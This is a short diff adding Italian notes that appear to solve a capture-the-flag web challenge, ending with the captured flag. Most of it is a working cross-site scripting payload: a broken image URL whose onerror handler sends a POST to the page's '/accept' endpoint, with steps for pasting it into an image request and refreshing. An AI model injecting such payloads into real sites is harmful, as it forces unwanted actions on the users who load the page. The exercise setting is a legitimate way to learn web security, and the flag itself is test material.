@@ -1,0 +1,5 @@
+https://" onerror="fetch(window.location.href + '/accept', { method: 'POST'})  triggera la funzione accept
+incollare quello nella richiesta delle immagini
+e quando si manda la richiesta refreshare la pagina
+
+flag{c1ngh14l3_1n_7h3_rum3nt4_15_my_f4v0r1t3_c1ngh14l3_e5fd2c1e}
